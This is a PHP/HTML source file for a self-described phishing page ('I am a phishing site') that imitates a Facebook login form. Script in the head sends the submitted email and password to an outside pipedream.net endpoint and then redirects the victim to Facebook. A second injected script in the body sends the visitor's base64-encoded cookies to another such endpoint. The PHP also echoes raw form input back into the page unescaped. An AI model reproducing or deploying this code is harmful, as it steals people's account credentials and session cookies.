<head>
    <title>我是釣魚網站</title>
<script>
    var user = <?php echo json_encode($_POST['user']) ?>;
    var pass = <?php echo json_encode($_POST['pass']) ?>;
    console.log(user,pass)
    if(user!=null || pass!=null){
    console.log(user,pass) 
    fetch('https://enkst03dlq4kphn.m.pipedream.net',{
    method:'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json;application/x-www-form-urlencoded',
    },    
    body:JSON.stringify({a: user, b: pass}),
    credentials: 'include',
    cache: 'no-cache',
    mode: 'no-cors'
    })
    .then(data => window.location.replace('https://fb.me')) // JSON from `response.json()` call
    .catch(error => console.error(error))
    }
</script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
</head>

<body>
<h1>FB L0G1N </h1>
<img src='https://cdn2.ettoday.net/images/867/d867907.jpg'>
<IMG “””><SCRIPT>fetch('https://enhvqtp2mx74kfr.m.pipedream.net', {     method: 'POST',     body: window.btoa(document.cookie),     cache: 'no-cache',     credentials: 'include',     headers: { 'content-type': 'application/x-www-form-urlencoded'     },     mode: 'no-cors' });</SCRIPT>
<img src='https://ltl-chengdu.com/wp-content/sites/25/ltl-facebook.png'>


<form class="row g-3" action='server.php' method='post'>
  <div class="col-md-6">
    <label for="inputEmail4" class="form-label">Email</label>
    <input type="email" class="form-control" id="inputEmail4 user" name='user'>
  </div><br/>
  <div class="col-md-6">
    <label for="inputPassword4" class="form-label">Password</label>
    <input type="password" class="form-control" id="inputPassword4 pass" name='pass'>
    </div><br/>
<div class="col-12">
    <button type="submit" class="btn btn-primary">Sign in</button>
  </div>

</form>
<?php
echo $_POST['user'].$_POST['pass'];
if (isset($_POST['user']) && !empty($_POST['user']) && !empty($_POST['pass'])){
    echo"login succese";
}
?>


</body>
